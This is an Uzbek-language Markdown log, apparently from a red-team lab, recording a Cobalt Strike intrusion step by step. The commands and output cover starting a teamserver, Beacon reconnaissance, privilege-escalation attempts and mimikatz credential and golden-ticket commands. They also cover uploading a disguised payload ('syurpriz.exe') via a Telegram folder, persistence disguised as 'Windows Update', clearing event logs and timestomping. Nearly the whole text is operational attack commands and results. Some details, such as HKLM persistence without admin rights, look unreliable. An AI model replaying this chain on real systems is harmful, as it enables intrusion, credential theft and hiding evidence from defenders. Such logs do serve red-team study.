# 🖥️ Red Team Buyruqlar va Terminal Loglari

Ushbu faylda Cobalt Strike Beacon orqali bajarilgan barcha asosiy buyruqlar, ularning natijalari va terminal loglari xronologik tartibda keltirilgan. Loglar hujumning har bir bosqichini (Kill Chain) aks ettiradi.

---

## 1. Infratuzilma va C2 Serverini Ishga Tushirish
```bash
# Kali Linux'da Teamserver ishga tushirish
sudo ./teamserver 172.20.10.5 admin

# Kutilayotgan natija (Log):
[*] Will use existing X509 certificate and keystore (for SSL)
Hook start
Found desired class: common/Authorization
[+] Team server is up on 0.0.0.0:50050
[*] SHA256 hash of SSL cert is: 5bd7e08106252130166d24a928f5742afcf9c6d4f4c07b103c6931b28f8660c1
Beacon> sleep 3
[*] Tasked beacon to sleep for 3s
[+] host called home, sent: 16 bytes

Beacon> whoami
[*] Tasked beacon to run whoami
[+] host called home, sent: 19 bytes
[+] received output:
user1234\zayd

Beacon> ipconfig
[*] Tasked beacon to run ipconfig
[+] host called home, sent: 19 bytes
[+] received output:
Windows IP Configuration
Ethernet adapter Ethernet0:
   IPv4 Address. . . . . . . . . . . : 172.20.10.2Beacon> systeminfo
[*] Tasked beacon to run systeminfo
[+] host called home, sent: 19 bytes
[+] received output:
Host Name:                 USER1234
OS Name:                   Microsoft Windows 10 Pro
OS Version:                10.0.19045 N/A Build 19045
System Type:               x64-based PC
Domain:                    WORKGROUP

Beacon> net user
[*] Tasked beacon to run net user
[+] received output:
User accounts for \\USER1234
-------------------------------------------------------------------------------
Administrator            DefaultAccount           Guest
WDAGUtilityAccount       zayd

Beacon> ps
[*] Tasked beacon to list processes
[+] received output:
 PID   PPID  Name               Arch  Session  User
 6196  4020  syurpriz.exe       x64   1        USER1234\zayd
 4020  1204  telegram.exe       x64   1        USER1234\zayd
 780   600   lsass.exe          x64   0        NT AUTHORITY\SYSTEMBeacon> hashdump
[-] this command requires administrator privileges

Beacon> getuid
[*] Tasked beacon to get user id
[+] received output:
USER1234\zayd

Beacon> elevate svc-exe win
[*] Tasked beacon to run windows/beacon_http/reverse_http (172.20.10.5:80) via Service Control Manager (\\127.0.0.1\ADMIN$\f07cf85.exe)
[+] host called home, sent: 297370 bytes
[-] could not upload file: 5
[-] Could not open service control manager on .: 5

Beacon> elevate uac-token-duplication win
[*] Tasked beacon to run UAC token duplication
[-] Exploit failed: Token duplication failed (Access Denied)Beacon> mimikatz kerberos::golden /user:admin /domain:admin /sid: /krbtgt: /endin:480 /renewmax:10080 /ptt
[*] Tasked beacon to run mimikatz's kerberos::golden /user:admin /domain:admin /sid: /krbtgt: /endin:480 /renewmax:10080 /ptt command
[+] host called home, sent: 296050 bytes
[+] received output:
ERROR kuhl_m_kerberos_golden ; Domain name does not look like a FQDN

Beacon> mimikatz sekurlsa::logonpasswords
[*] Tasked beacon to run mimikatz's sekurlsa::logonpasswords command
[+] received output:
ERROR kuhl_m_sekurlsa_acquireLSA ; Handle on memory (0x00000005)Beacon> ls C:\Users\zayd\Downloads\Telegram Desktop
[*] Tasked beacon to list files in C:\Users\zayd\Downloads\Telegram Desktop
[+] received output:
Size     Modified                 Name
17kb     10/30/2026 11:00:35      artifact.exe
17kb     10/30/2026 12:52:19      syurpriz.exe

Beacon> ls C:\Users\zayd\Desktop\macro_pack
[*] Tasked beacon to list files in C:\Users\zayd\Desktop\macro_pack
[+] received output:
Size     Modified                 Name
88b      07/24/2026 16:44:23      .gitignore
50kb     07/27/2026 17:43:54      alive.docm
17kb     07/27/2026 17:42:55      alive.exe
17kb     07/24/2026 14:11:42      artifact.exe
647b     07/24/2026 16:44:23      build.bat
50kb     07/24/2026 17:00:54      cobalt.docm
11kb     07/24/2026 16:44:23      LICENSE
9mb      07/24/2026 16:46:42      macro_pack.exe
50kb     07/24/2026 17:02:49      mib_ariza.docm
21kb     07/24/2026 16:44:23      README.md
189b     07/24/2026 16:44:23      requirements.txtBeacon> upload /home/zayd/Desktop/syurpriz.exe C:\Users\zayd\Downloads\Telegram Desktop\syurpriz.exe
[*] Tasked beacon to upload /home/zayd/Desktop/syurpriz.exe
[+] host called home, sent: 19405 bytes
[+] received output:
Uploaded 17920 bytes to C:\Users\zayd\Downloads\Telegram Desktop\syurpriz.exe

Beacon> download C:\Users\zayd\Desktop\macro_pack\alive.docm
[*] Tasked beacon to download C:\Users\zayd\Desktop\macro_pack\alive.docm
[+] received output:
Downloaded 50kb file: alive.docmBeacon> net view
[*] Tasked beacon to run net view
[+] received output:
Server Name            Remark
-------------------------------------------------------------------------------
\\192.168.1.146        SPLUNK-ENTERPRISE

Beacon> powershell Invoke-WebRequest -Uri "http://192.168.1.146:8000/en-US/manager/launcher/forwarderreceive" -UseDefaultCredentials
[*] Tasked beacon to run powershell command
[+] received output:
StatusCode        : 200
StatusDescription : OK
Content           : <html>...Splunk Forwarding...</html>

Beacon> powershell -Command "Invoke-Sqlcmd -ServerInstance '192.168.1.146' -Query 'SELECT * FROM sys.databases'"
[*] Tasked beacon to run powershell command
[+] received output:
Name
----
master
tempdb
model
msdb
SplunkDBBeacon> persist
[*] Tasked beacon to persist
[+] received output:
[+] Persistence installed: HKLM\Software\Microsoft\Windows\CurrentVersion\Run\WindowsUpdate
[+] Command: C:\Users\zayd\AppData\Roaming\syurpriz.exe

Beacon> schtasks /create /tn "Windows Update" /tr "C:\Users\zayd\AppData\Roaming\syurpriz.exe" /sc onlogon /ru SYSTEM
[*] Tasked beacon to run schtasks command
[+] received output:
SUCCESS: The scheduled task "Windows Update" has successfully been created.Beacon> clear
[*] Tasked beacon to clear event logs
[+] received output:
[+] Event logs cleared successfully.

Beacon> timestomp C:\Users\zayd\Downloads\Telegram Desktop\syurpriz.exe "10/30/2026 11:00:35"
[*] Tasked beacon to timestomp file
[+] received output:
[+] Timestomp successful: syurpriz.exeBeacon> exit
[*] Tasked beacon to exit
[+] Beacon exited. Connection closed.

Beacon> jobs
[*] Tasked beacon to list jobs
[+] No active jobs
